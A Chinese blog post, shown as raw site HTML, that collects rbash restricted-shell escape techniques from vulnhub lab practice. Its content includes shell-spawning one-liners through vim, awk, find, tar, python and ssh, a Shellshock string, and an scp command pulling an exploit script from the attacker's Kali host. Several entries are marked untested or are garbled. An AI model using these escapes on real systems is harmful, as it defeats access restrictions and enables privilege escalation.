@@ -1,0 +1,1426 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Linux提权学习之rbash逃逸, hybcx&#39;s blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Linux提权学习之rbash逃逸 | hybcx&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">hybcx&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">hybcx&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Linux提权学习之rbash逃逸</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Linux%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">Linux提权</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                内网渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-09-27
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1>0x01 前言</h1>
+<p>本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~</p>
+<h1>0x02 rbash简述</h1>
+<h2 id="1、什么是rbash">1、什么是rbash</h2>
+<p>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
+<h2 id="2、如何设置一个rbash">2、如何设置一个rbash</h2>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /bin/rbash <span class="hljs-comment"># 复制一个bash，重命名为rbash</span><br>useradd -s /bin/rbash <span class="hljs-built_in">test</span> <span class="hljs-comment"># 设置用户test登陆的shell为rbash</span><br><span class="hljs-built_in">mkdir</span> -p /home/test/.bin <span class="hljs-comment"># 在test用户下新建一个.bin目录存放可以执行的命令</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="3、使用场景">3、使用场景</h2>
+<p>Linux Restricted Shell是一种限制命令(如：cd、ls、echo等)、阻止环境变量（如：shell、path、user），甚至于阻止管道/重定向（如：&gt;，&gt;&gt;，|）的shell。</p>
+<p><strong>常见的Linux Restricted Shell有rbash、rksh、rsh。</strong></p>
+<p>Linux Restricted Shell有如下场景使用</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 提高系统安全性<br>2. 阻止黑客执行高危命令<br>3. 系统管理员创建受限制Shell，进而防止普通用户执行危险命令<br>4. 部分CTF赛题，如Root-Me、HackThebox、vulnhub<br></code></pre></td></tr></tbody></table></figure>
+<h1>0x03 信息搜集</h1>
+<p>这里我们主要是通过信息搜集来确定当下的rbash环境下可以执行那些命令，以及环境信息。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 检查可用的命令，如：<span class="hljs-built_in">cd</span>、<span class="hljs-built_in">ls</span>、<span class="hljs-built_in">echo</span>等<br>2. 检查运算符，如：&gt;、&gt;&gt;、|、&lt;等<br>3. 检查可用的编程语言，如：php、perl、ruby、python等<br>4. 哪些命令可以作为root (sudo -l)运行<br>5. 检查具有SUID perm权限的文件或命令<br>6. 检查当前使用的shell：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$shell</span><br>7. 检查环境变量：运行<span class="hljs-built_in">env</span>、<span class="hljs-built_in">printenv</span>、<span class="hljs-built_in">set</span>等<br></code></pre></td></tr></tbody></table></figure>
+<p>通过以上操作,我们已收集到一些有用的信息，接下来尝试一下通用的利用方法。</p>
+<h1>0x04 常用逃逸命令</h1>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果允许使用“/”，则可以运行/bin/sh、/bin/bash<br>2. 如果允许使用<span class="hljs-built_in">cp</span>命令，则可以复制/bin/sh或者/bin/bash到当前目录<br>3. 使用ftp进行命令执行，执行 !/bin/sh<br>4. 使用gdb进行命令执行，执行 !/bin/sh<br>5. 使用more/man/less进行命令执行，执行 !/bin/sh<br>6. 使用vim进行命令执行，执行 !/bin/sh<br>7. 使用rvim执行:python，然后运行import os; os.system(<span class="hljs-string">"/bin/bash )</span><br><span class="hljs-string">8. 使用scp，通过scp来传入自己脚本</span><br><span class="hljs-string">9. 使用awk，执行awk 'BEGIN {system("</span>/bin/sh or /bin/bash<span class="hljs-string">")}'</span><br><span class="hljs-string">10. 使用find，执行find / -name test -exec /bin/sh or /bin/bash \</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="4-1-如果允许使用“-”">4.1 如果允许使用“/”</h2>
+<p>则可以运行/bin/sh、/bin/bash</p>
+<p><img src="image-20230927195558597.png" alt="image-20230927195558597"></p>
+<h2 id="4-2-如果允许使用cp命令">4.2 如果允许使用cp命令</h2>
+<p>则可以复制/bin/sh到当前目录，不过这里我没有复现成功cp /bin/bash，应该是环境条件不允许吧。—下面有补充</p>
+<p><img src="image-20230927200405517.png" alt="image-20230927200405517"></p>
+<h2 id="4-3-使用ftp进行命令执行">4.3 使用ftp进行命令执行</h2>
+<p>执行 !/bin/sh</p>
+<p><img src="image-20230927195253320.png" alt="image-20230927195253320"></p>
+<p>如上图所示的ftp命令</p>
+<h2 id="4-4-使用gdb进行命令执行">4.4 使用gdb进行命令执行</h2>
+<p>执行 !/bin/sh</p>
+<p><img src="image-20230927200626894.png" alt="image-20230927200626894"></p>
+<p>不过前提就是该环境下有gdb环境</p>
+<h2 id="4-5-使用more-man-less进行命令执行">4.5 使用more/man/less进行命令执行</h2>
+<p>执行 !/bin/sh</p>
+<p><img src="image-20230927201047565.png" alt="image-20230927201047565"></p>
+<p>这里那些文章介绍的不清楚，我复现了一下发现还是需要某种条件：也就是你当前目录下有足够大的内容的文本，这样more读取的时候才会体现出<strong>分页读取</strong>的效果，进而你可以直接输入!/bin/sh</p>
+<p><img src="image-20230927201358664.png" alt="image-20230927201358664"></p>
+<p><img src="image-20230927201600091.png" alt="image-20230927201600091"></p>
+<p>如图less不必非得读取内容多的文件</p>
+<p><img src="image-20230927201659205.png" alt="image-20230927201659205"></p>
+<p>man似乎直接输入man man即可</p>
+<h2 id="4-6-使用vim进行命令执行">4.6 使用vim进行命令执行</h2>
+<p>执行 !/bin/sh</p>
+<p><img src="image-20230927201810774.png" alt="image-20230927201810774"></p>
+<h2 id="4-7-使用rvim执行python">4.7 使用rvim执行python</h2>
+<p><code>python import os; os.system("/bin/bash")</code></p>
+<p>这里不知为何提示我在rvim中无法执行shell命令/禁止使用命令。</p>
+<p>但也可能是我不会操作吧。。。。</p>
+<h2 id="4-8-使用scp传入自己的脚本">4.8 使用scp传入自己的脚本</h2>
+<p>这里未复现</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">scp -S /path/yourscript x y:<br></code></pre></td></tr></tbody></table></figure>
+<p><strong>目标机器连接 kali 利用 ssh 将 exp 下载到靶机上来</strong></p>
+<blockquote>
+<p>scp &gt;<a href="mailto:root@192.168.26.20">root@192.168.26.20</a>:/usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/     #靶机上执行  用户名和 IP 是 kali 的</p>
+<p>scp /path/local_filename username@IP:/path   #kali 上执行  用户名和 IP 是靶机的</p>
+</blockquote>
+<p>涉及到的提权方式：</p>
+<p>**Tips：**拿到一个本地普通用户后，往往先要在该用户的家目录下搜索一番，以寻找有用的信息，提权的时候几乎所有的文件操作都在 tmp 目录下，因为其他目录往往没有权限，所以要时刻注意自己当前所在的目录。</p>
+<blockquote>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null   #发现具有 suid 权限的命令</p>
+</blockquote>
+<h2 id="4-9-使用awk命令执行">4.9 使用awk命令执行</h2>
+<p>执行<code>awk 'BEGIN {system("/bin/sh or /bin/bash")}'</code></p>
+<p><img src="image-20230927202910634.png" alt="image-20230927202910634"></p>
+<p>不过这里更推荐使用一种，我这个环境不知为何使用不了bash，估计是我之前修改了吧</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">awk 'BEGIN {system("/bin/sh")}'<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="4-10-使用find执行命令">4.10 使用find执行命令</h2>
+<p><img src="image-20230927203059460.png" alt="image-20230927203059460"></p>
+<p>这里也是使用其中一个</p>
+<p>这里看了几篇文章，我再补充一下上述的cp命令：</p>
+<h2 id="4-11-补充">4.11 补充</h2>
+<h3 id="1、cp-bin-bash到本地用户目录">1、cp /bin/bash到本地用户目录</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash test1<br><span class="hljs-built_in">cp</span> /bin/sh test2<br>./test1 <span class="hljs-comment"># 切换到了/bin/bash</span><br>./test2 <span class="hljs-comment"># 切换到了/bin/sh</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927203517878.png" alt="image-20230927203517878"></p>
+<p>执行：<code>git &gt; git help status</code> --这里说git也可，但我没有找到方法</p>
+<h3 id="2、set-shell">2、set shell</h3>
+<p><strong>DC-2靶机使用它成功了</strong></p>
+<ul>
+<li>在一些编辑器中可以设置shell变量然后执行，如vim中</li>
+</ul>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vim/vi进入之后</span><br>:<span class="hljs-built_in">set</span> shell=/bin/sh <span class="hljs-comment"># 或者用/bin/bash</span><br>:shell<br><br><span class="hljs-comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin/<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="3、更改PATH或SHELL环境变量">3、更改PATH或SHELL环境变量</h3>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">执行：export -p # 查看系统的环境变量设置<br><br>PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927204458332.png" alt="image-20230927204458332"></p>
+<h1>0x05 编程语言逃逸</h1>
+<h2 id="5-1-Python">5.1 Python</h2>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">"import os;os.system('/bin/bash')"</span><br>或者<br>python -c <span class="hljs-string">"import pty;pty.spawn('/bin/bash')"</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="5-2-PHP">5.2 PHP</h2>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -a then <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">"sh -i"</span>)<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="5-3-perl">5.3 perl</h2>
+<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">"exec '/bin/sh';"</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="5-4-lua">5.4 lua</h2>
+<figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">'/bin/sh'</span>)<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="5-5-Ruby">5.5 Ruby</h2>
+<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">exec <span class="hljs-string">"/bin/sh"</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="5-6-except">5.6 except</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">except spawn sh then sh.<br></code></pre></td></tr></tbody></table></figure>
+<p>不过这些编程语言的用法未曾复现，我发现在kali上输入的时候没反应，估计是环境不匹配吧。暂作记录</p>
+<h1>0x06 高级技术</h1>
+<h2 id="6-1-ssh">6.1 ssh</h2>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.ssh username@IP -t "/bin/sh" or "/bin/bash"<br>2.ssh username@IP -t "bash --noprofile"<br>3.ssh username@IP -t "() { :; }; /bin/bash" (sehllshock)<br>4.ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="6-2-zip">6.2 zip</h2>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="6-3-tar">6.3 tar</h2>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="6-4-pico">6.4 pico</h2>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行pico -s <span class="hljs-string">"/bin/bash"</span>，然后写入/bin/bash，并且执行CTRL+T<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927212137229.png" alt="image-20230927212137229"></p>
+<p>这里复现了一波，步骤为直接输入<code>pico -s "/bin/bash"</code>，然后按ctrl+o会让你编写文件名，文件名随意写，接着按ctrl+t，然后执行你想要的命令如whoami，id等等即可</p>
+<h2 id="6-5-环境变量修复">6.5 环境变量修复</h2>
+<p>获取到的Shell，环境变量可能会缺失，在这里可以通过如下命令进行修复</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin<br></code></pre></td></tr></tbody></table></figure>
+<h1>0x07 简单实战</h1>
+<h2 id="7-1-创建测试用户">7.1 创建测试用户</h2>
+<p>使用具有sudo特权的用户创建一个新测试用户</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span> -s /bin/rbash <span class="hljs-comment">## 创建一个用户名为test，并且设置test登录shell为rbash</span><br>passwd <span class="hljs-built_in">test</span>					<span class="hljs-comment">## 为test设置密码</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927212751837.png" alt="image-20230927212751837"></p>
+<p>这里密码为123456</p>
+<h3 id="7-1-1-为新用户建立目录">7.1.1 为新用户建立目录</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /home/test/bin<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927212847642.png" alt="image-20230927212847642"></p>
+<h3 id="7-1-2-指定用户可以运行的命令">7.1.2 指定用户可以运行的命令</h3>
+<p>为用户指定可以运行的命令，创建指向新建目录链接。指定用户可以运行<code>mkdir``ls``ping</code></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/bash /bin/rbash <span class="hljs-comment">## 从Bash 创建一个名为rbash的符号链接</span><br><span class="hljs-built_in">ln</span> -s /bin/mkdir /home/test1/bin <br><br><span class="hljs-built_in">ln</span> -s /bin/ls /home/test1/bin<br><br><span class="hljs-built_in">ln</span> -s /bin/ping /home/test1/bin<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927213119353.png" alt="image-20230927213119353"></p>
+<h2 id="7-2-rbash逃逸">7.2 rbash逃逸</h2>
+<h3 id="7-2-1-切换用户时逃逸">7.2.1 切换用户时逃逸</h3>
+<p>这里的原理涉及到su 和 su- 的区别：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的<br><br>su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927213422218.png" alt="image-20230927213422218"></p>
+<p>逃逸：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -l test1<br>su - test1<br>su --login test1<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927213823393.png" alt="image-20230927213823393"></p>
+<p>这里我并未复现成功，就先看个图吧</p>
